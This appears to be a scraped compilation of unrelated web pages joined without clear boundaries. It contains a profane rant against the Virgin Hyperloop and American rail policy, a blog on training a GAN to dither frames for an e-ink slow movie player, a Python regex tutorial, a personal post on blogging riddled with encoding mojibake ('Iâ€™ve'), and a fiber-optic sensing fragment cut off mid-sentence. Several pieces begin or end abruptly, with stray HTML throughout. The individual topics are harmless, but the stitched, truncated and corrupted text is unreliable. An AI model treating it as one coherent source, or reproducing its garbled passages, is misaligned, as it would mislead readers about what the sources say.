<p><a href="https://www.cnn.com/2020/11/08/tech/virgin-hyperloop-passengers/index.html">CNN’s article about this event</a> paraphrases a Virgin Hyperloop executive claiming that the hyperloop pods “can travel at the speed of aircraft.” Which is true, in the sense that commercial aircraft with dozens if not hundreds of people aboard do sometimes travel at 100 miles per hour, on the ground, for seconds at a time, during takeoff or landing, when they are going only a fraction as fast as they’re capable of going. It is also true in the sense that, strictly speaking, a paper airplane is a form of “aircraft,” and you can really whip some of those suckers across a room. A more accurate but perhaps less flattering claim would be that my Honda Odyssey can travel at the fastest speed Virgin Hyperloop has yet attained, and with <em>four times as many people riding in it</em>.</p>



<p>Hell, for that matter, as <a href="https://twitter.com/leftistthot420/status/1326561247333134336">a Twitter user</a> helpfully pointed out, <a href="https://en.wikipedia.org/wiki/LNER_Class_A4_4468_Mallard">a freaking <em>steam locomotive</em> hit 126 miles per hour</a> in England, 82 years ago, in 1938.</p>



<p><em>Yeah, but, when it’s done, it’ll go 600 miles per hour</em>, you’re whining, <em>and it’ll have 25 to 30 people in a pod!</em> When exactly will that be? France opened the TGV in 1981. Japan’s oldest high-speed line debuted in 1964—<em>1964!</em>—and was better and faster then than Amtrak’s Acela trains go now. Shanghai’s maglev train has been operable since John Kerry was campaigning to unseat George W. Bush as president. Measure speed by the number of riders the respective services will have moved by, say, 2050. Measure it in carbon emissions. By the year 2020, the best-funded and most sophisticated high-speed rail developer in the United States moved two (2) people 500 meters.</p>



<p>The United States is generations behind much of the rest of the wealthy, industrialized world in this area. For all but a very narrow corridor along the East Coast serviced by the weak half-a-loaf shit that passes for high-speed rail in this country, the best an American commuter can hope for in intercity rail options are crappy and ancient diesel Amtrak trains that top out at around 80 miles per hour. Most American cities simply are not serviced by any intercity rail network at all. The U.S.’s shameful mass-transit situation—and thus its shameful dependence on personal vehicles, and all the downstream bad shit that comes from that—could be improved a zillion percent by just aiming for the level of railroad sophistication French people considered normal before the median 2020 French person was old enough to ride a bicycle. And here are these Professor Frink–ass Hyperloop dinguses, dumping resources beyond counting into inventing some shit that already exists when for a fraction of the cost and in a fraction of the time they could just <em>purchase</em> or at the very least <em>copy</em> what is already working just fine even in backward-ass doofus countries like freaking Italy. It wouldn’t need test tracks! It wouldn’t need years of iteration and development! They already did all that shit, all over the rest of the world! </p>



<p>In a vacuum (a figurative one: an alternate universe in which the rest of the post-industrial world were not absolutely goddamn <em>bursting</em> with operating networks of authentic high-speed rail; where high-speed rail were not already such a well-developed form of transit that the TGV system, which routinely moves huge numbers of day-to-day commuters across large distances of France at speeds well more than twice that achieved by this sad two-person billion-dollar pod going from nowhere to nowhere across a tiny patch of worthless desert, were not both infinitely better and more sophisticated than any presently available commercial rail in the United States <em>and</em> fairly outmoded in comparison to newer [yet still not all that new!] systems in China and Japan and elsewhere) the Virgin Hyperloop could almost look like an impressive accomplishment. Alas, here in the world of context, its only real accomplishment is a promotional one. The business of the American technology sector and its attendant courtier press is to continually recreate and exploit something like a vacuum in the public’s awareness of what the larger world is like, so that clueless observers will congratulate a bunch of boobs for “inventing” a shittier, more expensive version of something that is already regarded as boring and normal—fast, energy-efficient rail service!—pretty much everywhere outside of this stupid and embarrassing country.</p>



<p>Everything about the broken incentives and hollowed-out capacities of American society is crystallized in this dumb pod moseying its way along a track to nowhere in Las Vegas. The United States has a problem: It is too dependent on inefficient, dirty, and expensive forms of transportation, because the vast majority of its people have no practical access to other kinds. Its infrastructure and the health of its communities are all jacked up by the necessity of splattering asphalt all over everything in order for people to drive their big dumb cars to, and park them near, anywhere they’d decide to go. It cannot achieve efficient levels of density or make meaningful turns toward environmental responsibility for as long as this is the case. Thankfully, a solution to this problem already exists and is in operation throughout other parts of the world with comparable levels of wealth and technological capacity: Trains! Networks of fast-moving trains that do not need internal combustion engines in order to move lots of people very quickly along their tracks! Companies and agencies make and install and operate these train systems, and have been doing so for a long time, longer even than the lifetime of the graybeard crap-bag writing this blog. They know how to do it! They can probably just be hired to do it. At some level somebody can probably just buy some of those trains, and install them, and turn them on, and take people from here to there on them.</p>



<p>But who could make it happen? Broke-dick, systematically impoverished municipalities, lashed to budget-balancing like a cinderblock tied to their feet? Close your eyes and try to imagine how a sane and obviously good decision like <em>Just import the TGV and run it between the big American cities instead of spending years and fortunes inventing maglev from scratch for no reason</em> could get made in these United States. Imagine who’d make it, and what their goals would be, and where the money would come from. It simply can’t get made on those terms. It can’t get made at all. No level of American society even has a mechanism for that anymore. If it doesn’t require a messianic assbrain with a Steve Jobs cosplay fantasy pitching some sleepy billionaire or venture capital firm on the possibility of cornering the market on a brand-new technology that will conquer the world, then it will not get done. If it merely delivers a profound benefit to the common good rather than the promise of extravagant enrichment to a shrinking class of hyper-powered parasites, then it simply cannot exist.</p>

<![CDATA[A GAN to generate dithers minimising frame difference for a slow movie player]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
  
<p>it's been about two years since i first saw the awesome
   <a href="https://medium.com/s/story/very-slow-movie-player-499f76c48b62">very slow movie player</a>
   project by bryan boyer. i thought it was such an excellent idea but never got around
   to buying the hardware to make one. more recently though i've seen a couple of references
   to the project so i decided it was finally time to make one.
</p>
<p>one interesting concern about an eink very slow movie player is the screen refresh. simpler
   eink screens refresh by doing a full cycle of a screen of white or black before displaying
   the new image. i hated the idea of an ambient slow player doing this every few minutes
   as it switched frames, so i wanted to make sure i got a piece of hardware that could do
   incremental update.
</p>
<p>after a bit of shopping around i settled on a
   <a href="https://www.waveshare.com/6inch-hd-e-paper-hat.htm">6 inch HD screen from waveshare</a>
</p>
<p>it ticks all the boxes i wanted
</p>
<ul>
 <li>
     6 inch
 </li>

 <li>
     1448×1072 high definition
 </li>

 <li>
     comes with a raspberry pi HAT
 </li>

 <li>
     and, most importantly, support partial refresh
 </li>
</ul>
<p>this screen also supports grey scale, but only with a flashy full cycle redraw,
   so i'm going to stick to just black and white since it supports the partial redraw.
</p>
<p>note: even though the partial redraw is basically instant it does suffer from a ghosting problem;
   when you draw a white pixel over a black one things are fine, but if you draw black over
   white, in the partial redraw, you get a slight ghosting of gray that is present until a
   full redraw :/
</p>


<p>so how do you display an image when you can only show black and white?
   dithering! here's an example of a 384x288 RGB image dithered using
   <a href="https://pillow.readthedocs.io/en/stable/reference/Image.html#PIL.Image.Image.convert">PILS implementation of the Floyd-Steinberg algorithm</a>
</p>
<table>
<tbody><tr><td><img src="http://matpalm.com/blog/imgs/2020/dn/eg.dither.png"></td></tr>
<tr><td>original RGB vs dithered version</td></tr>
</tbody></table>

<p>it makes intuitive sense that you could have small variations in the exact locations of the
   dots as long as you get the densities generally right. s
   so there's a reasonable question then; how do you dither in such a way that you get a
   good result, but with minimal pixel changes from a previous frame? (since we're
   motivated on these screens to change as little as possible)
</p>
<p>there are two approaches i see
</p>
<p>1) spend 30 minutes googling for a solution that no doubt someone came up with 20 years
   ago that can be implemented in 10 lines of c running at 1000fps ...
</p>
<p>2) .... or train an
   <a href="https://jax.readthedocs.io/">jax</a>
   based GAN to generate the dithers with a loss balancing a good dither vs no pixel change. :P
</p>


<p>when building a very slow movie player the most critical decision is...
   what movie to play?
   i really love the 1979 classic <a href="https://www.imdb.com/title/tt0078748/">alien</a>,
   it's such a great dark movie, so i thought i'd go with it.
   the movie is 160,000 frames so at a play back rate of a frame every 200 seconds
   it'll take just over a year to finish.
</p>
<p>note that in this type of problem there is no concern around overfitting.
   we have access to all data going in and so it's fine to overfit as much as we like;
   as long as we're minimising whatever our objective is we're good to go.
</p>


<p>i started with a
   <a href="https://arxiv.org/abs/1505.04597">unet</a>
   that maps 3 channel RGB images to a single channel dither.
</p>
<table>
<tbody><tr><td><img src="http://matpalm.com/blog/imgs/2020/dn/models.v1.png"></td></tr>
<tr><td>v1 architecture</td></tr>
</tbody></table>

<p>i tinkered a bit with the architecture but didn't spend too much time tuning it.
   for the final v3 result i ended with a pretty vanilla stack of encoders &amp; decoders
   (with skip connections connecting an encoder to the decoder at the same spatial resolution)
   each encoder/decoder block uses a residual like shortcut around a couple of convolutions.
   nearest neighbour upsampling gave a nicer result than deconvolutions in the decoder
   for the v3 result.
   also, <a href="https://arxiv.org/abs/1606.08415">gelu</a> is my new favorite activation :)
</p>
<p>for v1 i used a binary cross entropy loss of P(white) per pixel
   ( since it's what worked well for my
   <a href="http://matpalm.com/blog/counting_bees/">bee counting project</a> )
</p>
<p>as always i started by overfitting to a single example to get a baseline feel for capacity required.
</p>
<table>
<tbody><tr><td>
<img src="http://matpalm.com/blog/imgs/2020/dn/overfit.png">
</td></tr>
<tr><td>
v1 overfit result
</td></tr>
</tbody></table>

<p>when scaling up to the full dataset i switched to training on half resolution images
   against a patch size of 128. working on half resolution consistently gave a better
   result than working with the full resolution.
</p>
<p>as expected though this model gave us the classic type of problem we see with
   straight unet style image translation; we get a reasonable sense of the shapes, but no
   fine details around the dithering.

<p>side notes:
</p>
<ul>
 <li>
     for this v1 version using deconvolutions in the decoder
     (instead of nearest neighbour upsampling) actually looked pretty good!
     nicely captured texture for a dither with a surprisingly small network.
 </li>

 <li>
     i actually did some experiments using branches in the decoder for both upsampling
     and deconvolutions but the deconvs always dominated too much. i thought that would
     allow the upsampling to work as a kind of residual to the deconv but it never happened.

<p>for v2 i added a GAN objective in an attempt to capture finer details

<p>i started with the original
   <a href="https://arxiv.org/abs/1611.07004">pix2pix</a>
   objective but reasonably quickly moved to use a
   <a href="https://arxiv.org/abs/1701.07875">wasserstein</a>
   critic style objective since i've always found it more stable.
</p>
<p>the generator (G) was the same as the unet above with the discriminator (D) running patch based.
   at this point i also changed the reconstruction loss from a binary objective to just L1.
   i ended up using batchnorm in D, but not G.
   to be honest i only did a little did of manual tuning, i'm sure there's a better result
   hidden in the hyperparameters somewhere.
</p>
<p>so, for this version, the loss for G has two components
</p>
<pre>1. D(G(rgb))             # fool D
2. L1(G(rgb), dither)    # reconstruct the dither
</pre>

<p>very quickly (i.e. in &lt; 10mins ) we get a reasonable result that is started to
   show some more detail than just the blobby reconstruction.

<p>note: if the loss weight of 2) is 0 we degenerate to v1
   (which proved a useful intermediate debugging step).
   at this point i didn't want to tune to much since the final v3 is coming...
</p>


<p>for v3 we finally introduce a loss relating the previous frame
   (which was one of the main intentions of the project in the first place)
</p>
<p>now G takes not just the RGB image, but the dither of the previous frame.
</p>
<table>

<tr><td>

</tbody></table>

<p>the loss for G now has three parts
</p>
<pre>1. D(G(rgb_t1)) =&gt; real      # fool D
2. L1(G(rgb_t1), dither_t1)  # reconstruct the dither
3. L1(G(rgb_t1), dither_t0)  # don't change too much from the last frame
</pre>

<p>normally with a network that takes as input the same thing it's outputting
   we have to be careful to include things like teacher forcing.
   but since we don't intend to use this network for any kind of rollouts
   we can just always feed the "true" dithers in where required.
   having said that, rolling out the dithers from this network would be interesting :D
</p>


<p>the third loss objective, not changing too many pixels from the last frame,
   works well for generally stationary shots
   but is disastrous for scene changes :/
</p>
<p>consider the following graph for a sequence of frames showing the pixel difference
   between frames.
</p>
<p><img src="http://matpalm.com/blog/imgs/2020/dn/pixel_diff_between_scenes.png"></p><p>when there is a scene change we observe a clear "spike" in pixel diff. my first thought
   was to look for these and do a full redraw for them. it's very straightforward to
   find them (using a simple z-score based anomaly detector on a sliding window) but
   the problem is that it doesn't pick up the troublesome case of a panning shot where we don't
   have a scene change exactly. in these cases there is no abrupt scene change, but there
   are a lot of pixels changing so we end up seeing a lot of ghosting.
</p>
<p>i spent ages tinkering with the best way to approach this before deciding that a simple
   approach of <code>num_pixels_changed_since_last_redraw &gt; threshold</code> was good enough to decide
   if a full redraw was required (with a cooldown to ensure we not redrawing all the time)
</p>


<p>the v3 network gets a very good result <em>very</em> quickly; unsurprisingly since the dither at time
   t0 provided to G is a pretty good estimate of the dither at t1 :)
   i.e. G can get a good result simply by copying it!
</p>
<p>the following scenario shows this effect...
</p>
<p>consider three sequential frames, the middle one being a scene change.
</p>
<p><img src="http://matpalm.com/blog/imgs/2020/dn/v3.scene_eg.1.png"></p><p>at the very start of training the reconstruction loss is dominant and
   we get blobby outlines of the frame.
</p>
<p><img src="http://matpalm.com/blog/imgs/2020/dn/v3.scene_eg.2.png"></p><p>but as the contribution from the dither at time t0 kicks it things look good in general but
   the frames at the scene change end up being a ghosted mix attempt to copy through the old
   frame along with dithering the new one.
   (depending on the relative strength of the loss terms of G).
</p>
<p><img src="http://matpalm.com/blog/imgs/2020/dn/v3.scene_eg.3.png"></p>
<p>so the v3 version generally works and i'm sure with some more tuning i could get a better result
   but, as luck would have it, i actually find the results from v2 more appealing when testing
   on the actual eink screen. so even though the intention was do something like v3 i'm going to end
   up running something more like v2 (as shown in these couple of examples (though the resolution
   does it no justice (not to mention the fact the player will run about 5000 times slower than these
   gifs)))
</p>




<p>i'll update this section when i get a proper frame made (though i might try myself?) but for now the
   prototype lives balanced precariously on a piece of foam below it's younger sibling pi zero eink screen
   running game of life.

<ul>
 <li>
     for reconstruction and frame change i used L1 loss, but that's not exactly what we
     want. since we want to avoid the ghosting (white changing to black resulting in grey)
     we should try to avoid white to black but ignore black to white.
 </li>

 <li>
     we might be able to better handle scene changes by also including a
     loss component around the <em>next</em> frame.
 </li>

 <li>
     there's a padding issue where i train G on patches but when it's run on the full res
     version we get an edge artefact the size of the original patch (see image below).
     as a hacky fix i just padded the RGB image before passing it to …</li></ul></div></div>

November 13, 2020 | https://amitness.com/regex/ | <a href="https://web.archive.org/web/*/https://amitness.com/regex/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="text">
<p>It’s a common task in NLP to either check a text against a pattern or extract parts from the text that matches a certain pattern. A regular expression or “regex” is a powerful tool to achieve this.</p>
<p>While powerful, regex can feel daunting as it comes with a lot of features and sub-parts that you need to remember.</p>
<p>In this post, I will illustrate the various concepts underlying regex. The goal is to help you build a good mental model of how a regex pattern works.</p>
<h2 id="mental-model">Mental Model</h2>
<p>Let’s start with a simple example where we are trying to find the word ‘cool’ in the text.</p>
<p><img src="https://amitness.com/images/regex-mental-model-example.png" alt=""></p>
<p>With regex, we could simply type out the word ‘cool’ as the pattern and it will match the word.</p>

<p>While regex matched our desired word ‘<strong>cool</strong>’, the way it operates is not at the word level but the character level. This is the key idea.</p>
<blockquote>
<p><strong>Key Idea</strong>: Regex works at the character-level, not word-level.</p>
</blockquote>
<p><img src="https://amitness.com/images/regex-working.png" alt=""></p>
<p>The implication of this is that the regex <code>r'cool'</code> would match the following sentences as well.</p>
<p><img src="https://amitness.com/images/regex-exact-word-match.png" alt=""></p>
<h2 id="basic-building-blocks">Basic Building Blocks</h2>
<p>Now that we understand the key idea, let’s understand how we can match simple characters using regex.</p>
<h3 id="a-specific-character">a. Specific character</h3>
<p>We can simply specify the character in the regular expression and it will match all instances in the text.</p>
<p>For example, a regular expression given below will match all instances of ‘a’ in the text. You can use any of the small and capital alphabets.</p>

<p><img src="https://amitness.com/images/regex-match-only-a.png" alt=""></p>
<p>You can also use any digits from 0 to 9 and it will work as well.</p>

<p><img src="https://amitness.com/images/regex-python-3.7-example.png" alt=""></p>
<p>Note that regex is case-sensitive by default and thus the following regex won’t match anything.</p>

<p><img src="https://amitness.com/images/regex-not-matched-by-capital-a.png" alt=""></p>
<h3 id="b-white-space-character">b. White space character</h3>
<p>We can detect special characters such as whitespace and newlines using special escape sequences.</p>
<p><img src="https://amitness.com/images/regex-white-space-characters.png" alt=""></p>
<p>Besides the common ones above, we have:</p>
<ul>
<li><strong>\r</strong> for carriage return</li>
<li><strong>\f</strong> for form feed</li>
<li><strong>\e</strong> for escape.</li>
</ul>
<h3 id="c-special-sequences">c. Special sequences</h3>
<p>Regex provides a bunch of built-in special symbols that can match a group of characters at once. These begin with backslash <code>\</code>.</p>
<h4 id="pattern-d">Pattern: <code>\d</code></h4>
<p>It matches any single-digit number between 0 to 9.</p>
<p><img src="https://amitness.com/images/regex-single-digit.png" alt=""></p>
<p>Notice that matches are single digit. So we have 4 different matches below instead of a single number <code>18.04</code>.</p>
<p><img src="https://amitness.com/images/regex-ubuntu-18.04.png" alt=""></p>
<h4 id="pattern-s">Pattern: \s</h4>
<p>It matches any whitespace character (<span>space</span>, <span>tab</span> or <span>newline</span>).</p>
<p><img src="https://amitness.com/images/regex-match-any-whitespace.png" alt=""></p>
<h4 id="pattern-w">Pattern: \w</h4>
<p>It matches any of the small alphabets(a to z), capital alphabets(A to Z), digits (0 to 9), and underscore.</p>
<p><img src="https://amitness.com/images/regex-slash-w.png" alt=""></p>
<h4 id="pattern-">Pattern: .</h4>
<p>It matches any character except the new line (\n).</p>
<p><img src="https://amitness.com/images/regex-everything-except-newline.png" alt=""></p>
<div><div><pre><code><span>import</span> <span>re</span>

<span>&gt;&gt;&gt;</span> <span>re</span><span>.</span><span>findall</span><span>(</span><span>r'.'</span><span>,</span> <span>'line 1</span><span>\n</span><span>line2'</span><span>)</span>
<span>[</span><span>'l'</span><span>,</span> <span>'i'</span><span>,</span> <span>'n'</span><span>,</span> <span>'e'</span><span>,</span> <span>' '</span><span>,</span> <span>'1'</span><span>,</span> <span>'l'</span><span>,</span> <span>'i'</span><span>,</span> <span>'n'</span><span>,</span> <span>'e'</span><span>,</span> <span>'2'</span><span>]</span>
</code></pre></div></div>
<h4 id="pattern-negations">Pattern: Negations</h4>
<p>If you use the capitalized versions of the patterns above, they act as negation.</p>
<p>For example, if “\d” matched any digits from 0 to 9, then “\D” will match anything except “0 to 9”.</p>
<p><img src="https://amitness.com/images/regex-negation.png" alt=""></p>
<h3 id="d-character-sets">d. Character sets</h3>
<p>These are patterns starting with <code>[</code> and ending with <code>]</code> and specify the characters that should be matched enclosed by brackets.</p>
<p>For example, the following pattern matches any of the characters ‘a’, ‘e’, ‘i’, ‘o’, and ‘u’.
<img src="https://amitness.com/images/regex-aeiou.png" alt=""></p>
<p>You can also replicate the functionality of <code>\d</code> using the below pattern. It will match any digits between 0 to 9.
<img src="https://amitness.com/images/regex-1-to-9.png" alt=""></p>
<p>Instead of specifying all the digits, we can use <code>-</code> to specify only start and end digits. So, instead of <code>[0123456789]</code>, we can do:</p>
<p><img src="https://amitness.com/images/regex-refactor-all-digits.png" alt=""></p>
<p>For example, <code>[2-4]</code> can be used to match any digits between 2 to 4 i.e. (2 or 3 or 4).</p>
<p><img src="https://amitness.com/images/regex-year-2014-example.png" alt=""></p>
<p>You can even use the special characters we learned previously inside the brackets. For example, you can match any digit from 0 to 9 or whitespace as:</p>
<p><img src="https://amitness.com/images/regex-whitespace-or-digit.png" alt=""></p>
<p>Below, I have listed some useful common patterns and what they mean.</p>
<p><img src="https://amitness.com/images/regex-common-pattern-for-bracket.png" alt=""></p>
<h3 id="e-anchors">e. Anchors</h3>
<p>Regex also has special handlers to make the pattern only match if it’s at the start or end of the string.</p>
<p>We can use the <code>^</code> anchor to match patterns only at the start of a line. For example:</p>
<p><img src="https://amitness.com/images/regex-start-anchor.png" alt=""></p>
<p>Similarly, we can use the <code>$</code> anchor after the character to match patterns only if it’s the end of the line. For example:</p>
<p><img src="https://amitness.com/images/regex-anchor-end.png" alt=""></p>
<h3 id="f-escaping-metacharacters">f. Escaping metacharacters</h3>
<p>Consider a case where we want to exactly match the word “Mr. Stark”.</p>
<p>If we write a regex like <code>Mr. Stark</code>, then it will have an unintended effect. Since we know dot has a special meaning in a regex.</p>
<p><img src="https://amitness.com/images/regex-dot-issue.png" alt=""></p>
<p>So, we should always escape the special metacharacters like <code>.</code>, <code>$</code> etc. if our goal is to match the exact character itself.</p>
<p><img src="https://amitness.com/images/regex-dot-fixed.png" alt=""></p>
<p>Here is the list of metacharacters that you should remember to escape if you’re using them directly.</p>
<div><div><pre><code>^ $ . * + ? { } [ ] \ | ( )
</code></pre></div></div>
<h2 id="repetition-of-basic-blocks">Repetition of basic blocks</h2>
<p>Now that we can pattern match any characters, we could repeat things and start building more complicated patterns.</p>
<h3 id="a-naive-repetition">a. Naive repetition</h3>
<p>Using only what we have learned so far, a naive way would be to just repeat the pattern. For example, we can match two-digit numbers by just repeating the character-level pattern.</p>

<p><img src="https://amitness.com/images/regex-slash-d-slash-d.png" alt=""></p>
<h3 id="b-quantifiers">b. Quantifiers</h3>
<p>Regex provides special quantifiers to specify different types of repetition for the character preceding it.</p>
<h4 id="i-fixed-repetition">i. Fixed repetition</h4>
<p>We can use the <code>{...}</code> quantifier to specify the number of times a pattern should repeat.</p>
<p><img src="https://amitness.com/images/regex-manual-counts.png" alt=""></p>
<p>For example, the previous pattern for matching 2-digit number can be recreated as:</p>
<p><img src="https://amitness.com/images/regex-it-is-2020.png" alt=""></p>
<p>You can also specify a range of repetitions using the same quantifier. For example, to match from 2-digit to 4-digit numbers, we could use the pattern:</p>
<p><img src="https://amitness.com/images/regex-min-max-count.png" alt=""></p>
<p>When applied to a sentence, it will match both 4-digit and 2-digit numbers.</p>
<p><img src="https://amitness.com/images/regex-20-years-old.png" alt=""></p>
<div>
<p><strong>Note:</strong></p><p>
There should not be any space between minimum and maximum count For example, \d{2, 4} doesn't work.
</p>
</div>
<h4 id="ii-flexible-quantifiers">ii. Flexible quantifiers</h4>
<p>Regex also provides quantifiers “*”, “+” and “?” using which you can specify flexible repetition of a character.</p>
<ul>
<li>
<p><strong>0 or 1 times</strong>: <code>?</code><br>
The <code>?</code> quantifier matches the previous character if it repeats 0 or 1 times. This can be useful to make certain parts optional. It is equivalent to <code>{0,1}</code>.</p>
<p><img src="https://amitness.com/images/regex-question-mark-clarify.png" alt=""></p>
<p>For example, let’s say we want to match both the word “sound” and “sound” where “s” is optional. Then, we can use the <code>?</code> quantifier that matches if a character repeats 0 or 1 times.<br>
<img src="https://amitness.com/images/regex-question-mark-example.png" alt=""></p>
</li>
<li>
<p><strong>one or more times</strong>: <code>+</code><br>
The <code>+</code> quantifier matches the previous character if it repeats 1 or more times. It is equivalent to <code>{1,}</code>.</p>
<p>For example, we could find numbers of any arbitrary length using the regex <code>\d+</code>.</p>
<p><img src="https://amitness.com/images/regex-example-of-plus.png" alt=""></p>
</li>
<li>
<p><strong>zero or more times</strong>: <code>*</code><br>
The <code>*</code> quantifier matches the previous character if it repeats zero or more times. It is equivalent to <code>{0,}</code>.</p>
</li>
</ul>
<h2 id="usage-in-python">Usage in Python</h2>
<p>Python provides a module called “re” in the standard library to work with regular expression.</p>
<h3 id="need-for-raw-strings">Need for raw strings</h3>
<p>To specify a regular expression in Python, we precede it with <strong>r</strong> to create raw strings.</p>

<p>To understand why we precede with <strong>r</strong>, let’s try printing the expression <strong>\t</strong> without <code>**r**</code>.</p>
<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>pattern</span> <span>=</span> <span>'</span><span>\t</span><span>'</span>
<span>&gt;&gt;&gt;</span> <span>print</span><span>(</span><span>pattern</span><span>)</span>

</code></pre></div></div>
<p>You can see how when we don’t use raw string, the string <code>\t</code> is treated as the escape character for tab by Python.</p>
<p>Now let’s convert it into raw string. We get back whatever we specified.</p>
<div><div><pre><code><span>&gt;&gt;&gt;</span> <span>pattern</span> <span>=</span> <span>r'\t'</span>
<span>&gt;&gt;&gt;</span> <span>print</span><span>(</span><span>pattern</span><span>)</span>
\<span>t</span>
</code></pre></div></div>
<h3 id="using-re-module">Using re module</h3>
<p>To use <code>re</code> module, we can start by importing the <code>re</code> module as:</p>

<h4 id="1-refindall">1. re.findall</h4>
<p>This function allows us to get all the matches as a list of strings.</p>
<div><div><pre><code><span>import</span> <span>re</span>
<span>re</span><span>.</span><span>findall</span><span>(</span><span>r'\d'</span><span>,</span> <span>'123456'</span><span>)</span>
</code></pre></div></div>
<div><div><pre><code>['1', '2', '3', '4', '5', '6']
</code></pre></div></div>
<h4 id="2-rematch">2. re.match</h4>
<p>This function searches for a pattern at the beginning of the string and returns the first occurrence as a match object. If the pattern is not found, it returns None.</p>
<div><div><pre><code><span>import</span> <span>re</span>

<span>match</span> <span>=</span> <span>re</span><span>.</span><span>match</span><span>(</span><span>r'batman'</span><span>,</span> <span>'batman is cool'</span><span>)</span>
<span>print</span><span>(</span><span>match</span><span>)</span>
</code></pre></div></div>
<div><div><pre><code>&lt;re.Match object; span=(0, 6), match='batman'&gt;
</code></pre></div></div>
<p><img src="https://amitness.com/images/regex-match-object.png" alt=""></p>
<p>With the match object, we can get the matched text as</p>


<p>In a case where our pattern is not at the start of the sentence, we will not get any match.</p>
<div><div><pre><code><span>import</span> <span>re</span>

<span>match</span> <span>=</span> <span>re</span><span>.</span><span>match</span><span>(</span><span>r'batman'</span><span>,</span> <span>'The batman is cool'</span><span>)</span>
<span>print</span><span>(</span><span>match</span><span>)</span>
</code></pre></div></div>

<h4 id="3-research">3. re.search</h4>
<p>This function also finds the first occurrence of a pattern but the pattern can occur anywhere in the text. If the pattern is not found, it returns None.</p>
<div><div><pre><code><span>import</span> <span>re</span>

<span>match</span> <span>=</span> <span>re</span><span>.</span><span>search</span><span>(</span><span>r'batman'</span><span>,</span> <span>'the batman is cool'</span><span>)</span>
<span>print</span><span>(</span><span>match</span><span>.</span><span>group</span><span>())</span>
</code></pre></div></div>

  <p>This may fly in the face of conventional wisdom.</p>



<p>In the last few days Iâ€™ve watched about 20 video tutorials on blogging and read similar nubmer of articles.</p>

<p>One very common refrain from these blogging experts is:</p>

<blockquote>
  <p>just start writing!</p>
</blockquote>

<p>This is great advice. My blog has languished too long because I procrastinate horribly, doing research, tweaking my wording, improving my website styling etc. â€œJust start writingâ€� is clearly the solution to all my problems, if I can do it.</p>

<p>But thereâ€™s another frequent piece of advice that seems to contradict this:</p>

<blockquote>
  <p>quality is king!</p>
</blockquote>

<p>Time was, they say, that you could just write down your stream of consciousness and have a successful blog. No longer. Nowadays, there are so many quality content producers that you need to stand out.</p>

<p>So far, so reasonable.</p>

<p>But then they go on to say that to stay ahead in this cuthroat world of blogging, you need to <em>only publish quality content</em>.</p>

<p>This is the worst thing for me to hear.</p>

<p>Until yesterday, Iâ€™d not published anything for 21 months! The reason? I expect perfection from myself, and nothing less will do. Iâ€™m so intimidated by the enormity of the amazing ground-breaking article Iâ€™m about to write any second now that I just procrastinate starting forever.</p>



<p>In my world of web development, we have a saying:</p>

<blockquote>
  <p><a href="https://en.wikipedia.org/wiki/Release_early,_release_often">Release early, release often</a></p>
</blockquote>

<p>We release our products as early as we possibly can - while they only do the bare minimum and sometimes while they still have bugs. Then we make improvements fast.</p>

<p>This is for two reasons:</p>

<ol>
  <li>Because itâ€™s easy for new products to get caught up in a cycle of endless tweaking and never get released, and</li>
  <li>Once itâ€™s out in the world, you can start to see how much people actually like it. You have much more knowledge</li>
</ol>

<p>Why couldnâ€™t the same theory apply to blogging?</p>



<p>One reason to be careful about â€œreleasing earlyâ€� is the potential for reputational damage. If youâ€™re well known, releasing a sub-par product could tarnish your reputation.</p>

<p>So, if a blogger like myself was trying to build a reputation, and their success depended on this reputation, then you would want to be very careful about publishing sub-par content.</p>

<p>However, my experiene of blogging so far is that basically none of my readers know who I am. They find my posts through Google (other search engines are available), read that post, and bugger off. I suspect this is how most blogs are consumed.</p>

<p>Even if people find my articles through, say, my Twitter feed (where hopefully they at least vaguely know who I am), theyâ€™re still only going to click on the articles that look good to them.</p>

<p>If Iâ€™m right about this, it really doesnâ€™t matter how much crap content you produce, as long as you produce <em>some</em> good content. And if youâ€™ve written a bad article that no-one visits, you can always improve it later to make it a good one.</p>



<p>As I <a href="https://robinwinslow.uk/2020/11/13/i-am-a-blogger/">mentioned yesterday</a>, Iâ€™m currently trying to revive my blog. Iâ€™m going to do this by setting the bar for publishing content very low for myself, and hoping to publish daily. At least for a while.</p>

<p>Iâ€™m not going to spend a long time on editing, or let myself expect too much of my posts. Iâ€™m just going to do what I can.</p>

<p>This is my second post in 2 days. So far so good, I guess.</p>

<p>Letâ€™s see how it goes from here.</p>

The sensors can take temperature readings everywhere a fiber is placed, thereby generating a continuous heat diagram of a given site – even if the site stretches for dozens of kilometers. That provides crucial insight into possible accidents before they happen.</p><h2><b>Improving signal quality</b></h2><p>Working in association with the <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fenglish.bupt.edu.cn%2F&amp;t=ODNlMzM2MmUxMjkwODAxNjhjM2ExODU4ZWEyMTNiMjkwNDNjNWQ3ZCx6YW5YWDQyOA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F634716239692955648%2Fnew-fiber-optics-100x-faster&amp;m=0&amp;ts=1605558027">Beijing University of Posts and Telecommunications</a>, two GFO engineers – postdoc Zhisheng Yang and PhD student Simon Zaslawski – developed a new system for encoding and decoding data sent along the fibers. With their method, sensors can receive higher-energy signals and decode them faster, resulting in measurements taken more rapidly and over a larger area. Their research <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.nature.com%2Farticles%2Fs41467-020-19201-1&amp;t=ZDVhODVlNjE3ZTNmOGFiMjBkYjliNzBmNzE5MjNmMGEyNDRkMDNmYix6YW5YWDQyOA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F634716239692955648%2Fnew-fiber-optics-100x-faster&amp;m=0&amp;ts=1605558027">has just been published in <i>Nature Communications</i>.</a></p><p>The engineers describe their system as working like an echo. If you shout a single word, you hear that word back. But if you sing out a song, what you hear back is a blend of sounds that are hard to distinguish. You would need a “key” to decipher the sounds and make them intelligible. Fiber optic sensors function in a similar manner, except that an instrument sends out light pulses – rather than sounds – along a fiber. Signals bounce back up the fiber and a device decodes them, turning the signals into usable data.</p><p>To make the sensors more efficient, Yang and Zaslawski grouped the light pulses into sequences so that the signals bounce back with greater intensity. However, that didn’t solve the “echo” problem – that is, finding a key to make the signals readable. So they developed a method for encoding the data sent along a fiber; their method employs special genetic 